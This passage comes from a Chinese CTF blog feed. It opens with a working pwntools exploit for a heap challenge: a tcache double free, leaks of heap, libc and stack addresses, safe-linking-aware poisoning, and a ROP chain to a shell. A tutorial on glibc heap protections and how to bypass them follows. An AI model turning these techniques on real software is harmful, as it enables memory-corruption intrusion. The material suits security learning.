class="comment">#gdb.attach(io)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./[NSSRound21Basic]want_girlfriend&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,content1,content2</span>): <span class="comment">#content1:0x10 content2:0x20 content1-&gt;new content2-&gt;new+0x10</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;height:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;name\n&#x27;</span>,content1)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;describe\n&#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;now???\n&#x27;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;now???\n&#x27;</span>,<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(): <span class="comment">#new(0x10) new+0x10(0x20) if(new+0x30) new+0x30(0x20)</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">love_inject</span>(<span class="params">content</span>): <span class="comment">#content 0x20 new+0x38</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;520&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;love\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">love_destory_key</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;520&#x27;</span>)</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x90</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">free() <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Your girlfriend is &quot;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">8</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0xc0</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">free() <span class="comment">#0</span></span><br><span class="line">creat(<span class="number">0x90</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free()</span><br><span class="line">    love_destory_key()</span><br><span class="line">free() <span class="comment"># in unsortedbin flag=-6</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Your girlfriend is &quot;</span>)</span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span> <span class="comment">#main_arena与unsortedbin的偏移在高版本为96</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libcbase=main_arena-<span class="number">0x21ac80</span> <span class="comment">#ida分析给出的libc.so.6中的malloc_trim函数中得到偏移</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget_offset=0xebc81 #最初眼花了以为got表可写，还想打one_gadget(</span></span><br><span class="line"><span class="comment">#getshell=libcbase+onegadget_offset</span></span><br><span class="line"></span><br><span class="line">environ_add=libcbase+libc.sym[<span class="string">&quot;environ&quot;</span>] <span class="comment">#offset with love return = 0x140,调试得到</span></span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0xb0</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-5</span></span><br><span class="line">free() <span class="comment">#-6</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-7</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-8 只有tcache-&gt;counts中的数据大于0时才能从对应tcachebin中申请到chunk，所以double free的时候我们要多free一次 </span></span><br><span class="line">creat(<span class="number">0xb0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(environ_add-<span class="number">0x30</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-7</span></span><br><span class="line">creat(<span class="number">0xb0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(environ_add-<span class="number">0x30</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-6</span></span><br><span class="line">creat(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#-5 (environ-0x30) chunk</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your love: &#x27;</span>)</span><br><span class="line">love_ret=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x140</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(love_ret))</span><br><span class="line"></span><br><span class="line">sh_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi_ret=libcbase+<span class="number">0x02a3e5</span></span><br><span class="line">ret=libcbase+<span class="number">0x029139</span></span><br><span class="line"></span><br><span class="line">creat(<span class="number">0xa0</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-4</span></span><br><span class="line">free() <span class="comment">#-5</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-6</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-7</span></span><br><span class="line">creat(<span class="number">0xa0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(love_ret-<span class="number">0x38</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-6</span></span><br><span class="line">creat(<span class="number">0xa0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(love_ret-<span class="number">0x38</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-5</span></span><br><span class="line">rop_chain=p64(ret)+p64(pop_rdi_ret)+p64(sh_add)+p64(sys_add)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    creat(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">creat(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">love_inject(rop_chain)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不同版本下glibc有关堆的管理和保护</title>
      <link href="/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/"/>
      <url>/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>记录一下不同版本glibc下的堆管理保护机制的变化(开个坑，以后慢慢记录补充<br>先贴上几篇参考博客<br><a href="https://nopnoping.github.io/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">不同版本glibc的堆管理和新增保护机制 - Luexp</a><br><a href="https://jkilopu.github.io/2021/05/12/glibc%E5%90%84%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E4%BF%9D%E6%8A%A4/">glibc各版本的堆保护 | jkilopu’s blog</a><br><a href="https://s0fr.github.io/2020/05/10/libc230/">Glibc中堆管理的变化 | 白里个白</a><br><a href="https://www.cnblogs.com/LynneHuan/p/17822172.html">Glibc高版本堆利用方法总结 - LynneHuan - 博客园</a><br>然后ubuntu和glibc不同版本的对应关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ubuntu-libc version</span><br><span class="line"></span><br><span class="line">2.23=“16.04”</span><br><span class="line">2.24=“17.04”</span><br><span class="line">2.26=“17.10”</span><br><span class="line">2.27=“18.04”</span><br><span class="line">2.28=“18.10”</span><br><span class="line">2.29=“19.04”</span><br><span class="line">2.30=“19.10”</span><br><span class="line">2.31=“20.04”</span><br><span class="line">2.32=“20.10”</span><br><span class="line">2.33=“21.04”</span><br><span class="line">2.34=“22.04”</span><br></pre></td></tr></table></figure><h2 id="0x01-关于tcachebins"><a href="#0x01-关于tcachebins" class="headerlink" title="0x01 关于tcachebins"></a>0x01 关于tcachebins</h2><p>在glibc2.26+，引入了tcachebins<br>有两个比较关键的函数<code>tcache_get()</code>和<code>tcache_put()</code>(以下为glibc2.28中的源码)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数会在函数 <code>__int_free</code>和 <code>__libc_malloc</code>的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于0x408并且当给定大小的 <code>tcache bin</code> 未满时调用。一个 <code>tcache bin</code> 中的最大块数<code>mp_.tcache_count</code>是7<br>当程序进行 <code>malloc</code> 操作时，会优先检查 <code>tcache</code> 是否有可用的 <code>chunk</code>，如果有，就直接返回。同样，当进行 <code>free</code> 操作时，如果 <code>chunk</code> 的大小符合要求，并且对应的 <code>tcache bin</code> 还未满（默认每个 bin 可以存放 7 个 chunk），就会把 <code>chunk</code> 放入 <code>tcache</code>。否则，会按照原来的流程，放入 <code>unsorted bin</code>  中<br>在 <code>tcache_get</code>中，仅仅检查了 <code>tc_idx</code>，此外，我们可以将 <code>tcache</code> 当作一个类似于 <code>fastbin</code> 的单独链表，只是它的 <code>check</code>，并没有 <code>fastbin</code> 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next</code>.<br><code>tcachebins</code>并不是由<code>main_arena</code>（位于libc数据段）管理的，而是由<code>tcache_perthread_struct</code>（位于堆段）管理的。具体管理机制见<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/">另一篇博客</a></p><h2 id="0x02-tcache-key与safe-linking"><a href="#0x02-tcache-key与safe-linking" class="headerlink" title="0x02 tcache_key与safe-linking"></a>0x02 tcache_key与safe-linking</h2><p>参考博客<br><a href="https://zikh26.github.io/posts/501cca6.html#safe-Linking">Safe-Linking 机制的绕过 | ZIKH26’s Blog</a><br><a href="https://pdf.suer.cc/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/">tcache bin key加密机制</a><br>在glibc2.29+，tcache bin引入了tcache的key加密机制，<code>tcache_entry</code>中新加了一个<code>key</code>字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> key;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们看引入了<code>key</code>之后的<code>tcache_put()</code>的部分源码（以下为glibc2.32+）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chunk2mem</code>函数是返回我们<code>free</code>的<code>chunk</code>的实际数据区，也就是去除推头0x10的部分。将其<code>key</code>字段（即fd后的0x8字节）设置为<code>tcache_key</code>。在<code>free</code>一个<code>chunk</code>时候，会检查其<code>key</code>字段的值，如果等于对应<code>tcachebins</code>的<code>tcache_key</code>，说明已经释放过，则会报错中断，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    b&#x27;free(): double free detected in tcache 2\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2b bytes:</span><br><span class="line">    b&#x27;timeout: the monitored command dumped core\n&#x27;</span><br></pre></td></tr></table></figure><p>要绕过这一机制进行<code>double free</code>，需要能够破坏<code>free</code>的<code>chunk</code>的<code>key</code>值即可。<br>至于<code>safe-linking</code>，在glibc2.32+引入，在上面源码就可以看到（<strong>fastbins</strong>中同样引入了这一保护，下面以<code>tcache</code>来叙述，都是类似的）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>这一段就是对<code>tcache_entry</code>中的next指针加密。这个宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>也就是被释放的chunk在<code>tcache-&gt;entry</code>中的<code>next</code>指针值等于被释放的<code>chunk</code>本身的<code>mem</code>地址右移12位再异或上其要指向的<code>chunk</code>（原本<code>tcachebins</code>中的第一个<code>chunk</code>）的<code>mem</code>地址。我们自己简单验证一下。在glibc2.35版本中我们可以看到如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x555555559</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559320</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x55500000c7f9</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555593b0</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x55500000c669</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559440</span><br><span class="line">Size: 0x20bc0 (with flag bits: 0x20bc1)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x90 [  3]: 0x5555555593c0 —▸ 0x555555559330 —▸ 0x5555555592a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; print/x (0x5555555593c0 &gt;&gt; 12) ^ 0x555555559330</span><br><span class="line">$1 = 0x55500000c669</span><br><span class="line">pwndbg&gt; print/x (0x555555559330 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line">$2 = 0x55500000c7f9</span><br><span class="line">pwndbg&gt; print/x (0x5555555592a0 &gt;&gt; 12) ^ 0</span><br><span class="line">$3 = 0x555555559</span><br></pre></td></tr></table></figure><p>这是笔者自己写的先申请三个<code>chunk</code>再先后<code>free</code>的程序的调试结果。可以看到第三个<code>chunk</code>的<code>fd</code>为<code>0x55500000c669</code>，并不是其应该指向的<code>0x555555559330</code>。我们经过<code>safe-linking</code>的加密，<code>(0x5555555593c0 &gt;&gt; 12) ^ 0x555555559330＝0x55500000c669</code>。<br>特别的，对于第一个释放的<code>chunk1</code>，其<code>fd</code>值为<code>0x555555559</code>，因为其在释放时对应的<code>tcachebins</code>为空，其本来应该指向的是<strong>0</strong>，那么加密之后其实就是其本身<code>mem</code>地址（fd地址）右移12位。在这种情况下，其加密其实并没有达到预期效果，只需左移12位便可以恢复其地址，实现绕过<br>发现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  print/x (0x55500000c7f9 ^ 0x5555555592a0) &lt;&lt; 12</span><br><span class="line">$4 = 0x555555559000</span><br><span class="line">pwndbg&gt; print/x (0x55500000c669 ^ 0x555555559330) &lt;&lt; 12</span><br><span class="line">$5 = 0x555555559000</span><br><span class="line">pwndbg&gt; print/x (0x555555559 ^ 0) &lt;&lt; 12</span><br><span class="line">$6 = 0x555555559000</span><br></pre></td></tr></table></figure><p>在同一页内存的<code>chunk</code>，其fd值异或上其指向的真实值再左移12位便得到了<code>heap_base</code>。（堆内存按页分配，heap_base都是0x1000的整数倍）<br>例如在一个存在uaf漏洞的程序中，我们申请一个<code>chunk</code>，然后放入<code>tcachebin</code>中，再访问其<code>fd</code>值，得到的<code>fd</code>值左移12位便是<code>heap_base</code>，其实是<code>heap_base =（leak_add ^ 0）&lt;&lt; 12</code>，因为此时对应的<code>tcachebins</code>中只有这一个<code>chunk</code>，其<code>fd</code>指向的”真实地址”就是<strong>0</strong> <br>然后就是关于<code>entries</code>指针数组和对应<code>tcachebins</code>的关系，其实二者指向的是同一块内存，源码中在操作时候对<code>e-&gt;key，e-&gt;next</code>的赋值其实也就是对<code>tcachebins</code>中相应<code>chunk</code>的<code>key</code>字段和<code>fd</code>域的赋值。<br>在<code>safe-linking</code>引入后，<code>tcache_perthread_struct</code>的<code>entries</code>数组中存放的依然是对应<code>tcachebins</code>的第一个<code>chunk</code>的真实的<code>mem</code>地址（索引方式见<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/">我的另一篇博客</a>），所以我们劫持<code>tcache_perthread_struct</code>后仍然可以直接覆盖<code>entries</code>数组的元素为我们的目标地址。<br>然而在<code>safe-linking</code>保护下，我们使用<code>tcache poisoning</code>修改<code>tcachebins</code>中的<code>chunk</code>的<code>fd</code>域的时候，就需要将目标地址进行加密操作再覆盖。<br>例如我们已经泄露了<code>heap_base</code>，要修改<code>tcachebins</code>中的第一个<code>chunk</code>的<code>fd</code>，便要计算<code>val =((heap_base+0x2a0) &gt;&gt; 12) ^ target_addr</code>，用这个<code>val</code>来投毒。<code>target_addr</code>便是我们想利用<code>tcache poisoning</code>申请的地址，至于<code>heap_base+0x2a0</code>便是我们想要修改<code>fd</code>域的<code>chunk</code>的<code>mem</code>地址（<code>0x290</code>是在glibc2.32+下的<code>tcache_perthread_struct</code>的大小，那么<code>heap+0x290+0x10</code>便是我们申请的第一个<code>chunk</code>的<code>mem</code>地址，也就是此例子中我们要进行投毒的<code>chunk</code>。具体的地址要具体调试分析，此处只是为了方便以申请的第一个<code>chunk</code>为例。）<br>然而在实际上，右移12位后，16进制下地址的后三位都被移出，不会产生影响。也就是说，对和<code>heap_base</code>同一页（单位0x1000）下的<code>chunk</code>进行<code>tcache poisoning</code>时候，只需要直接使用<code>(heap_base&gt;&gt;12)^target_addr</code>即可。</p><h2 id="0x03-关于hooks"><a href="#0x03-关于hooks" class="headerlink" title="0x03 关于hooks"></a>0x03 关于hooks</h2><p>各种hooks在glibc2.34+都被移除了。在glibc2.34之前的版本中对hooks的劫持时是控制程序执行流的重要方法<br>在malloc.c中可以看到几个全局钩子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 钩子指针声明 */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__realloc_hook)</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__memalign_hook)</span><span class="params">(<span class="type">size_t</span> alignment, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">const</span> <span class="type">void</span> *caller)</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化钩子 */</span></span><br><span class="line"><span class="type">void</span> (*weak_variable __malloc_initialize_hook)(<span class="type">void</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这几个钩子也正是pwn中劫持的重点关照对象。这几个hook大多都能在libc中直接查到偏移位置。（例如<code>libc.sym[&#39;__free_hook&#39;]</code>）<br>关于钩子的触发，以<code>__malloc_hook</code>为例，源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  <span class="comment">// [1] 钩子检查</span></span><br><span class="line">  <span class="type">void</span> *(*hook)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>)); <span class="comment">// 触发钩子调用</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// [2] 常规分配流程</span></span><br><span class="line">  <span class="type">void</span> *result = _int_malloc(&amp;main_arena, bytes);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// [3] 分配失败处理</span></span><br><span class="line">  <span class="keyword">return</span> malloc_check(result, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行<code>__libc_malloc</code>函数时候会先检查<code>__malloc_hook</code>，如果钩子非空，则直接执行指向的函数（或被篡改的可执行的地址）。其他几个全局钩子也是类似的，调用对应的函数时候，都会先检查对应的hook，不空则直接执行。<br>比如打<code>__free_hook</code>，改为system函数然后在chunk中写入<code>&#39;/bin/sh\x00&#39;</code>,直接free对应chunk即可。我们看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void __libc_free(void *mem) &#123;</span><br><span class="line">  // 钩子检查</span><br><span class="line">  void 